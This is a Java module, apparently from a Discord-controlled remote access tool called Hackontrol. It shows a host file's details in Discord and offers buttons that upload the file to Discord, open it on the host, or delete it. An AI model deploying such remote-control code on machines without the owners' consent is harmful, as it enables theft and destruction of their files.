package com.khopan.hackontrol.module.file;

import java.awt.Desktop;
import java.awt.Graphics2D;
import java.awt.RenderingHints;
import java.awt.image.BufferedImage;
import java.awt.image.RenderedImage;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.nio.file.Files;
import java.nio.file.attribute.BasicFileAttributeView;
import java.nio.file.attribute.BasicFileAttributes;
import java.util.ArrayList;
import java.util.List;
import java.util.Locale;
import java.util.function.Consumer;
import java.util.function.Supplier;

import javax.imageio.ImageIO;
import javax.swing.Icon;
import javax.swing.JPanel;
import javax.swing.filechooser.FileSystemView;

import com.khopan.hackontrol.Hackontrol;
import com.khopan.hackontrol.manager.interaction.ButtonContext;
import com.khopan.hackontrol.manager.interaction.ButtonManager;
import com.khopan.hackontrol.manager.interaction.ButtonManager.ButtonType;
import com.khopan.hackontrol.manager.interaction.Question;
import com.khopan.hackontrol.manager.interaction.Question.QuestionResponse;
import com.khopan.hackontrol.manager.interaction.Question.QuestionType;
import com.khopan.hackontrol.utils.HackontrolError;
import com.khopan.hackontrol.utils.HackontrolFile;
import com.khopan.hackontrol.utils.HackontrolFile.FileCountAndSize;
import com.khopan.hackontrol.utils.interaction.HackontrolButton;
import com.khopan.hackontrol.utils.sendable.ISendableReply;
import com.khopan.hackontrol.utils.sendable.sender.ConsumerMessageCreateDataSendable;
import com.khopan.hackontrol.utils.HackontrolMessage;
import com.khopan.hackontrol.utils.TimeSafeReplyHandler;

import net.dv8tion.jda.api.EmbedBuilder;
import net.dv8tion.jda.api.interactions.callbacks.IReplyCallback;
import net.dv8tion.jda.api.interactions.components.ItemComponent;
import net.dv8tion.jda.api.utils.FileUpload;
import net.dv8tion.jda.api.utils.messages.MessageCreateBuilder;
import net.dv8tion.jda.api.utils.messages.MessageCreateData;

public class FileEmbedSender implements Runnable {
	private final File root;
	private final Consumer<MessageCreateData> action;

	private FileEmbedSender(File root, Consumer<MessageCreateData> action) {
		this.root = root;
		this.action = action;
	}

	private void questionDelete(QuestionResponse response, ButtonContext context) {
		if(!QuestionResponse.POSITIVE.equals(response)) {
			return;
		}

		String path = this.root.getAbsolutePath();
		Hackontrol.LOGGER.info("Deleting '{}'", path);

		if(!HackontrolFile.delete(this.root)) {
			HackontrolError.message(context.message(), "Failed to delete '" + path + '\'');
			return;
		}

		HackontrolMessage.delete(context);
	}

	private void buttonDownload(ButtonContext context) {
		if(!this.checkFileExistence(context)) {
			return;
		}

		Hackontrol.LOGGER.info("Downloading '{}'", this.root.getAbsolutePath());
		TimeSafeReplyHandler.start(context, consumer -> {
			FileUpload upload;

			try {
				upload = HackontrolFile.upload(this.root);
			} catch(Throwable Errors) {
				HackontrolError.throwable(ConsumerMessageCreateDataSendable.of(consumer), Errors);
				return;
			}

			MessageCreateData message = MessageCreateData.fromFiles(upload);
			consumer.accept(message);
		});
	}

	private void buttonOpen(ButtonContext context) {
		if(!this.checkFileExistence(context)) {
			return;
		}

		Hackontrol.LOGGER.info("Opening '{}'", this.root.getAbsolutePath());

		try {
			Desktop.getDesktop().open(this.root);
		} catch(Throwable Errors) {
			HackontrolError.throwable(context.reply(), Errors);
			return;
		}

		context.deferEdit().queue();
	}

	private void buttonDeleteFile(ButtonContext context) {
		if(!this.checkFileExistence(context)) {
			return;
		}

		Question.create(context.reply(), "Are you sure you want to delete '" + this.root.getAbsolutePath() + "'?", QuestionType.YES_NO, response -> this.questionDelete(response, context));
	}

	private boolean checkFileExistence(ISendableReply reply) {
		if(!this.root.exists()) {
			HackontrolError.message(reply.reply(), "File '" + this.root.getAbsolutePath() + "' does not exist");
			return false;
		}

		return true;
	}

	@Override
	public void run() {
		EmbedBuilder embedBuilder = new EmbedBuilder();
		embedBuilder.setTitle(this.root.getName());
		boolean exist = this.root.exists();
		embedBuilder.setColor(exist ? 0xFF57F287 : 0xFFED4245);
		FileUpload upload;

		try {
			upload = FileUpload.fromData(FileEmbedSender.imageToByteArray(FileEmbedSender.getFileImage(this.root, 128, 128)), "icon.png");
		} catch(Throwable Errors) {
			upload = null;
		}

		if(upload != null) {
			embedBuilder.setThumbnail("attachment://icon.png");
		}

		this.field(embedBuilder, "Path", this.root.getAbsolutePath());
		this.fileSystemView(embedBuilder);
		this.fileAttribute(embedBuilder);
		this.fileSize(embedBuilder);
		MessageCreateBuilder messageBuilder = new MessageCreateBuilder();
		messageBuilder.addEmbeds(embedBuilder.build());

		if(upload != null) {
			messageBuilder.addFiles(upload);
		}

		List<ItemComponent> buttonList = new ArrayList<>();
		buttonList.add(ButtonManager.dynamicButton(ButtonType.SUCCESS, "Download", this :: buttonDownload));
		buttonList.add(ButtonManager.dynamicButton(ButtonType.SUCCESS, "Open", this :: buttonOpen));
		buttonList.add(ButtonManager.dynamicButton(ButtonType.DANGER, "Delete " + (exist && this.root.isFile() ? "File" : "Folder"), this :: buttonDeleteFile));
		buttonList.add(HackontrolButton.delete());
		messageBuilder.addActionRow(buttonList);
		Hackontrol.LOGGER.info("File Viewer: '{}'", this.root.getAbsolutePath());
		this.action.accept(messageBuilder.build());
	}

	private void fileSystemView(EmbedBuilder builder) {
		FileSystemView view = FileSystemView.getFileSystemView();
		this.field(builder, "Display Name", view.getSystemDisplayName(this.root));
		this.field(builder, "Type", view.getSystemTypeDescription(this.root));
	}

	private void fileAttribute(EmbedBuilder builder) {
		BasicFileAttributes attributes = this.getFileAttributes(this.root);
		String created = this.safeCall(() -> String.format(Locale.ROOT, "<t:%d:R>", attributes.creationTime().toMillis() / 1000L));
		String lastModified = this.safeCall(() -> String.format(Locale.ROOT, "<t:%d:R>", attributes.lastModifiedTime().toMillis() / 1000L));
		String lastAccess = this.safeCall(() -> String.format(Locale.ROOT, "<t:%d:R>", attributes.lastAccessTime().toMillis() / 1000L));
		this.field(builder, "Created", created);
		this.field(builder, "Modified", lastModified);
		this.field(builder, "Accessed", lastAccess);
	}

	private void fileSize(EmbedBuilder builder) {
		long size;

		if(this.root.isDirectory()) {
			FileCountAndSize countAndSize = HackontrolFile.getFileCountAndSize(root);
			size = countAndSize.folderSize;
			this.field(builder, "File Count", String.valueOf(countAndSize.fileCount));
		} else {
			size = this.root.length();
		}

		this.field(builder, "Size", HackontrolFile.getFileSizeDisplay(size));
	}

	private BasicFileAttributes getFileAttributes(File file) {
		try {
			return Files.getFileAttributeView(file.toPath(), BasicFileAttributeView.class).readAttributes();
		} catch(Throwable Errors) {
			return null;
		}
	}

	private void field(EmbedBuilder builder, String label, String value) {
		builder.addField(label, value == null ? "Unavailable" : value, true);
	}

	private String safeCall(Supplier<String> action) {
		try {
			return action.get();
		} catch(Throwable Errors) {
			return null;
		}
	}

	public static void start(File root, Consumer<MessageCreateData> action) {
		if(root == null) {
			throw new NullPointerException("Root cannot be null");
		}

		if(action == null) {
			throw new NullPointerException("Action cannot be null");
		}

		Thread thread = new Thread(new FileEmbedSender(root, action));
		thread.setName("Hackontrol File Query Thread");
		thread.start();
	}

	public static void reply(File root, IReplyCallback callback) {
		TimeSafeReplyHandler.start(callback, consumer -> FileEmbedSender.start(root, consumer));
	}

	private static BufferedImage iconToBufferedImage(Icon icon) {
		if(icon == null) {
			throw new NullPointerException("Icon cannot be null");
		}

		int width = icon.getIconWidth();
		int height = icon.getIconHeight();
		BufferedImage image = new BufferedImage(width, height, BufferedImage.TYPE_INT_ARGB);
		Graphics2D Graphics = image.createGraphics();
		Graphics.setRenderingHint(RenderingHints.KEY_ANTIALIASING, RenderingHints.VALUE_ANTIALIAS_ON);
		icon.paintIcon(new JPanel(), Graphics, 0, 0);
		Graphics.dispose();
		return image;
	}

	private static byte[] imageToByteArray(RenderedImage image) {
		if(image == null) {
			throw new NullPointerException("Image cannot be null");
		}

		try {
			ByteArrayOutputStream stream = new ByteArrayOutputStream();
			ImageIO.write(image, "png", stream);
			return stream.toByteArray();
		} catch(Throwable Errors) {
			throw new RuntimeException(Errors);
		}
	}

	private static BufferedImage getFileImage(File file, int width, int height) {
		if(file == null) {
			throw new NullPointerException("File cannot be null");
		}

		try {
			BufferedImage image = ImageIO.read(file);

			if(image == null) {
				throw new RuntimeException();
			}

			int imageWidth = image.getWidth();
			int imageHeight = image.getHeight();
			int newWidth = 0;
			int newHeight = 0;

			if(imageWidth > imageHeight) {
				newWidth = width;
				newHeight = (int) Math.round(((double) imageHeight) / ((double) imageWidth) * ((double) width));
			} else {
				newWidth = (int) Math.round(((double) imageWidth) / ((double) imageHeight) * ((double) height));
				newHeight = height;
			}

			BufferedImage result = new BufferedImage(newWidth, newHeight, BufferedImage.TYPE_INT_ARGB);
			Graphics2D Graphics = result.createGraphics();
			Graphics.setRenderingHint(RenderingHints.KEY_ANTIALIASING, RenderingHints.VALUE_ANTIALIAS_ON);
			Graphics.drawImage(image.getScaledInstance(newWidth, newHeight, BufferedImage.SCALE_SMOOTH), 0, 0, null);
			Graphics.dispose();
			return result;
		} catch(Throwable Errors) {

		}

		FileSystemView view = FileSystemView.getFileSystemView();
		Icon icon = view.getSystemIcon(file, width, height);

		if(icon == null) {
			return null;
		}

		return FileEmbedSender.iconToBufferedImage(icon);
	}
}